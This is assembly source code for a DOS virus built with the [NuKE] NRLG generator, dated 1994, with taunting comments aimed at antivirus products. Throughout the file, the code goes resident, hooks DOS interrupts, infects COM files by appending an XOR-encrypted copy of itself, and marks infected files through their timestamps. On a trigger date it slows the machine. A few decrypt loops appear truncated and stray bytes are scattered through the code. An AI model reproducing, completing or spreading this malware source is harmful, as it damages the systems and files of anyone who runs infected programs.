;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
;³ THiS iS a [NuKE] RaNDoMiC LiFe GeNeRaToR ViRuS.        ³ [NuKE] PoWeR
;³ CReaTeD iS a N.R.L.G. PRoGRaM V0.66 BeTa TeST VeRSioN  ³ [NuKE] WaReZ
;³ auToR: aLL [NuKE] MeMeBeRS                             ³ [NuKE] PoWeR
;³ [NuKE] THe ReaL PoWeR!                                 ³ [NuKE] WaReZ
;³ NRLG WRiTTeR: AZRAEL (C) [NuKE] 1994                   ³ [NuKE] PoWeR
;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

.286
code    segment
assume cs:code,ds:code
org  100h

start:  CALL NEXT 
 
NEXT:  
       mov di,sp             ;take the stack pointer location 
       mov bp,ss:[di]        ;take the "DELTA HANDLE" for my virus       
       sub bp,offset next    ;subtract the large code off this code 
                             ;
;*******************************************************************
;                      #1 DECRYPT ROUTINE                               
;*******************************************************************

cmp byte ptr cs:[crypt],0b9h ;is the first runnig?        
je crypt2                    ;yes! not decrypt              
;----------------------------------------------------------                                          
mov cx,offset fin            ;cx = large of virus               
lea di,[offset crypt]+ bp    ;di = first byte to decrypt          
mov dx,1                     ;dx = value for decrypt          
;----------------------------------------------------------                                                   
deci:                        ;deci = fuck label!                                    
;----------------------------------------------------------

ÿinc di
inc di
;----------------------------------------------------------                                                
jmp bye                      ;######## BYE BYE F-PROT ! ##########     
mov ah,4ch
int 21h
bye:                         ;#### HEY FRIDRIK! IS ONLY A JMP!!###      
;-----------------------------------------------------------                               
mov ah,0bh                   ;######### BYE BYE TBAV ! ##########     
int 21h                      ;### (CANGE INT AT YOU PLEASURE) ###        
;----------------------------------------------------------                                   
loop deci                    ;repeat please!               
                             ;           
;*****************************************************************
;                   #2 DECRYPT ROUTINE                                                    
;*****************************************************************
                              ;    
crypt:                        ;fuck label!                  
                              ;                
mov cx,offset fin             ;cx = large of virus                 
lea di,[offset crypt2] + bp   ;di = first byte to decrypt                  
;---------------------------------------------------------------                                              
deci2:                        ;              
xor byte ptr cs:[di],1        ;decrytion rutine          
inc di                        ;very simple...            
loop deci2                    ;           
;---------------------------------------------------------------
crypt2:                       ;fuck label!          
                              ;                  
MOV AX,0CACAH                 ;call to my resident interrup mask                  
INT 21H                       ;for chek "I'm is residet?"   
CMP Bh,0CAH                   ;is equal to CACA?
JE PUM2                       ;yes! jump to runnig program
call action
;*****************************************************************
; NRLG FUNCTIONS  (SELECTABLE)
;*****************************************************************

ÿ;****************************************************************
;               PROCESS TO REMAIN RESIDENT                                                                  
;****************************************************************   

mov   ax,3521h                  
int   21h                        ;store the int 21 vectors 
mov   word ptr [bp+int21],bx     ;in cs:int21
mov   word ptr [bp+int21+2],es   ;
;---------------------------------------------------------------
push cs                          ; 
pop ax                           ;ax = my actual segment                             
dec ax                           ;dec my segment for look my MCB
mov es,ax                        ;
mov bx,es:[3]                    ;read the #3 byte of my MCB =total used memory
;---------------------------------------------------------------
push cs                          ;   
pop es                           ;   
sub bx,(offset fin - offset start + 15)/16  ;subtract the large of my virus 
sub bx,17 + offset fin           ;and 100H for the PSP total
mov ah,4ah                       ;used memory
int 21h                          ;put the new value to MCB
;---------------------------------------------------------------
mov bx,(offset fin - offset start + 15)/16 + 16 + offset fin     
mov ah,48h                      ;                              
int 21h                         ;request the memory to fuck DOS!                                                 
;---------------------------------------------------------------
dec ax                          ;ax=new segment 
mov es,ax                       ;ax-1= new segment MCB 
mov byte ptr es:[1],8           ;put '8' in the segment
;--------------------------------------------------------------                                
inc ax                          ; 
mov es,ax                       ;es = new segment
lea si,[bp + offset start]      ;si = start of virus 
mov di,100h                     ;di = 100H (psp position) 
mov cx,offset fin - start       ;cx = lag of virus
push cs                         ;
pop ds                          ;ds = cs
cld                             ;mov the code
rep movsb                       ;ds:si >> es:di
;--------------------------------------------------------------
mov dx,offset virus             ;dx = new int21 handler
mov ax,2521h                    ;
push es                         ; 
pop ds                          ; 
int 21h                         ;set the vectors 
;-------------------------------------------------------------
pum2:                               ;  
                                    ; 
mov ah,byte ptr [cs:bp + real]      ;restore the 3  
mov byte ptr cs:[100h],ah           ;first bytes  
mov ax,word ptr [cs:bp + real + 1]  ;
mov word ptr cs:[101h],ax           ;
;-------------------------------------------------------------
mov ax,100h                         ;
jmp ax                              ;jmp to execute
                                    ;
;*****************************************************************
;*             HANDLER FOR THE INT 21H                                       
;*****************************************************************
                          ;          
VIRUS:                    ;  
                          ;     
cmp ah,4bh                ;is a 4b function? 
je REPRODUCCION           ;yes! jump to reproduce !
cmp ah,11h
je dir
cmp ah,12h
je dir
dirsal:
cmp AX,0CACAH             ;is ... a caca function? (resident chek)
jne a3                    ;no! jump to a3
mov bh,0cah               ;yes! put ca in bh
a3:                       ;
JMP dword ptr CS:[INT21]  ;jmp to original int 21h
ret                       ;    
make db '[NuKE] N.R.L.G. AZRAEL'
dir:
jmp dir_s
;-------------------------------------------------------------
REPRODUCCION:              ;       
                           ;
pushf                      ;put the register
pusha                      ;in the stack
push si                    ;
push di                    ;
push bp                    ;
push es                    ;
push ds                    ;
;-------------------------------------------------------------
push cs                    ;  
pop ds                     ;  
mov ax,3524H               ;get the dos error control                      
int 21h                    ;interupt                        
mov word ptr error,es      ;and put in cs:error                      
mov word ptr error+2,bx    ;            
mov ax,2524H               ;change the dos error control                    
mov dx,offset all          ;for my "trap mask"                      
int 21h                    ;         
;-------------------------------------------------------------
pop ds                     ;
pop es                     ;restore the registers
pop bp                     ;
pop di                     ;
pop si                     ;
popa                       ;
popf                       ;
;-------------------------------------------------------------
pushf                      ;put the registers
pusha                      ;     
push si                    ;HEY! AZRAEL IS CRAZY?
push di                    ;PUSH, POP, PUSH, POP
push bp                    ;PLEEEEEAAAAAASEEEEEEEEE
push es                    ;PURIFY THIS SHIT!
push ds                    ;
;-------------------------------------------------------------
mov ax,4300h                 ;       
int 21h                      ;get the file     
mov word ptr cs:[attrib],cx  ;atributes   
;-------------------------------------------------------------
mov ax,4301h                 ;le saco los atributos al        
xor cx,cx                    ;file 
int 21h                      ;
;-------------------------------------------------------------  
mov ax,3d02h                 ;open the file 
int 21h                      ;for read/write
mov bx,ax                    ;bx=handle
;-------------------------------------------------------------
mov ax,5700h                ;     
int 21h                     ;get the file date  
mov word ptr cs:[hora],cx   ;put the hour    
mov word ptr cs:[dia],dx    ;put the day    
and cx,word ptr cs:[fecha]  ;calculate the seconds    
cmp cx,word ptr cs:[fecha]  ;is ecual to 58? (DEDICATE TO N-POX)    
jne seguir                  ;yes! the file is infected!     
jmp cerrar                  ;
;------------------------------------------------------------
seguir:                     ;     
mov ax,4202h                ;move the pointer to end
call movedor                ;of the file
;------------------------------------------------------------
push cs                     ;   
pop ds                      ; 
sub ax,3                    ;calculate the 
mov word ptr [cs:largo],ax  ;jmp long
;-------------------------------------------------------------
mov ax,04200h               ;move the pointer to  
call movedor                ;start of file
;----------------------------------------------------------                                          
push cs                     ;   
pop ds                      ;read the 3 first bytes  
mov ah,3fh                  ;                           
mov cx,3                    ;
lea dx,[cs:real]            ;put the bytes in cs:[real]
int 21h                     ;
;----------------------------------------------------------                                          
cmp word ptr cs:[real],05a4dh   ;the 2 first bytes = 'MZ' ?
jne er1                         ;yes! is a EXE... fuckkk!
;----------------------------------------------------------
jmp cerrar
er1:
;----------------------------------------------------------                                          
mov ax,4200h      ;move the pointer                               
call movedor      ;to start fo file
;----------------------------------------------------------                                          
push cs           ;       
pop ds            ; 
mov ah,40h        ;  
mov cx,1          ;write the JMP
lea dx,[cs:jump]  ;instruccion in the
int 21h           ;fist byte of the file
;----------------------------------------------------------                                          
mov ah,40h         ;write the value of jmp
mov cx,2           ;in the file 
lea dx,[cs:largo]  ; 
int 21h            ;
;----------------------------------------------------------                                          
mov ax,04202h      ;move the pointer to 
call movedor       ;end of file
;----------------------------------------------------------                                          
push cs                     ;        
pop ds                      ;move the code  
push cs                     ;of my virus      
pop es                      ;to cs:end+50     
cld                         ;for encrypt          
mov si,100h                 ;    
mov di,offset fin + 50      ;      
mov cx,offset fin - 100h    ;        
rep movsb                   ;      
;----------------------------------------------------------                                          
mov cx,offset fin           
mov di,offset fin + 50 + (offset crypt2 - offset start)  ;virus         
enc:                              ;           
xor byte ptr cs:[di],1            ;encrypt the virus              
inc di                            ;code                   
loop enc                          ;              
;---------------------------------------------------------
mov cx,offset fin           
mov di,offset fin + 50 + (offset crypt - offset start)  ;virus         
mov dx,1
enc2:                              ;           

ÿinc di
inc di                             ;the virus code                  
loop enc2                          ;              
;--------------------------------------------
mov ah,40h                       ;  
mov cx,offset fin - offset start ;copy the virus              
mov dx,offset fin + 50           ;to end of file
int 21h                          ;
;----------------------------------------------------------                                          
cerrar:                          ;
                                 ;restore the       
mov ax,5701h                     ;date and time    
mov cx,word ptr cs:[hora]        ;file   
mov dx,word ptr cs:[dia]         ;     
or cx,word ptr cs:[fecha]        ;and mark the seconds  
int 21h                          ; 
;----------------------------------------------------------                                          
mov ah,3eh                       ; 
int 21h                          ;close the file
;----------------------------------------------------------                                          
pop ds                           ;
pop es                           ;restore the 
pop bp                           ;registers
pop di                           ; 
pop si                           ;
popa                             ;
popf                             ;
;----------------------------------------------------------                                          
pusha                           ;   
                                ;                                                             
mov ax,4301h                    ;restores the atributes 
mov cx,word ptr cs:[attrib]     ;of the file  
int 21h                         ;   
                                ;
popa                            ; 
;----------------------------------------------------------                                          
pushf                           ;                           
pusha                           ; 8-(  = f-prot                       
push si                         ;                       
push di                         ; 8-(  = tbav   
push bp                         ;                       
push es                         ; 8-)  = I'm                        
push ds                         ;                              
;----------------------------------------------------------                                          
mov ax,2524H                    ;                         
lea bx,error                    ;restore the                         
mov ds,bx                       ;errors handler      
lea bx,error+2                  ;                         
int 21h                         ;                       
;----------------------------------------------------------                                          
pop ds                          ;
pop es                          ;
pop bp                          ;restore the 
pop di                          ;resgisters
pop si                          ;
popa                            ;
popf                            ;
;----------------------------------------------------------                                          
JMP A3                          ;jmp to orig. INT 21
                                ;
;**********************************************************
;           SUBRUTINES AREA
;**********************************************************
                                ;
movedor:                        ;   
                                ; 
xor cx,cx                       ;use to move file pointer         
xor dx,dx                       ;       
int 21h                         ;        
ret                             ;        
;----------------------------------------------------------                                          
all:                            ;  
                                ; 
XOR AL,AL                       ;use to set 
iret                            ;error flag

;***********************************************************
;         DATA AREA
;***********************************************************
largo  dw  ?
jump   db  0e9h
real   db  0cdh,20h,0
hora   dw  ?
dia    dw  ?
attrib dw  ?
int21  dd  ?
error  dd  ?

ÿ;---------------------------------
action:                          ; 
MOV AH,2AH                       ;        
INT 21H                          ;get date           
CMP Dl,byte ptr cs:[action_dia+bp]  ;is equal to my day?                 
JE  cont                         ;nop! fuck ret          
cmp byte ptr cs:[action_dia+bp],32  ;
jne no_day                       ;
cont:                            ; 
cmp dh,byte ptr cs:[action_mes+bp]  ;is equal to my month?            
je set                           ;
cmp byte ptr cs:[action_mes+bp],13  ;
jne NO_DAY                       ;nop! fuck ret           
set:                             ; 
        
mov ax,351ch                     ;
int 21h                          ;store the int 1ch vectors 
mov word ptr [trampaint+bp],bx      ;in cs:trampaint
mov word ptr [trampaint+2+bp],es    ;
mov ax,251ch                     ;put the int 1ch (clock) vector     
push cs                          ;   
pop ds                           ;  
mov dx,offset tardar             ;in offset tardar
int 21h                          ;  
mov dx,offset fin                ;
int 27h                          ;main resident the code
NO_DAY:                          ;             
ret                              ;ret for program
tardar:                          ;int 1c handler
pushf                            ;
pusha                            ;
mov cx,0ffffh                    ;fuck loop for slow speed
trampa:                          ;
mov ax,ax                        ;
loop trampa                      ;
popa                             ;
popf                             ;
JMP dword ptr CS:[trampaint+bp]     ;jmp to original int 1ch
ret                              ;
trampaint  dd  ?                 ;
;--------------------------------;

ÿ;-------------;
Dir_S:        ;                                                      
jmp dirsal    ;  
no_Good:iret  ;                                                           
;-------------;

ÿaction_dia Db 01H ;day for the action
action_mes Db 01H ;month for the action
FECHA DW 018H ;Secon for mark
FECHAd Db 018H ;Secon for mark dir st
fin:
code ends
end start
